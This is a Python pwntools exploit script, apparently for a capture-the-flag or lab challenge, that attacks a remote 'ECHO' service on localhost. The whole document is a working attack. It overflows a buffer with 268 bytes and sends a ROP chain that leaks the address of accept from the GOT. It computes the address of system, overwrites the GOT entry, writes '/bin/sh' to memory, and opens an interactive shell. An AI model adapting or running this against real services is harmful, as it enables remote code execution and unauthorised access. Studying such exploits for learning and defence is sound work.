#!/usr/bin/python 
from pwn import *
__author__ = 'TaQini'
# context.log_level = 'debug'

buf = 0x804a058
pppr = 0x8048c0d
ppr = pppr + 1
pr = ppr + 1

recv_line = 0x8048744
send_len = 0x80487cc
send_str = 0x8048848
accept_plt = 0x80485c0
accept_got = 0x804a01c
accept_addr = 0xed430
system_addr = 0x40310
offset = system_addr - accept_addr

r = remote('localhost',1234)

r.recvuntil('Welcome to Remote *ECHO* Service!\n')
payload = "A" * 268
rop = (
        p32(send_len),
        p32(ppr),
        p32(accept_got),
        p32(4),
        # leak accept, calc system

        p32(recv_line),
        p32(pr),
        p32(accept_got),
        # overwrite accept_got

        p32(recv_line),
        p32(pr),
        p32(buf),
        # write bin/sh; to buf

        p32(accept_plt),
        p32(0xdeadbeef),
        p32(buf),
        # exec /bin/sh;
        )
payload += ''.join(rop)

r.sendline(payload)
r.recv()

raw_input('leaking addr')
accept = u32(r.recv(4))
system = accept + offset
log.success('system = ' + hex(system))

raw_input('overwrite accept_got')
r.sendline(p32(system))
log.success('done.')

raw_input('exec /bin/sh')
r.sendline('/bin/sh\x00')
log.success('here\'s the shell:')

r.interactive()
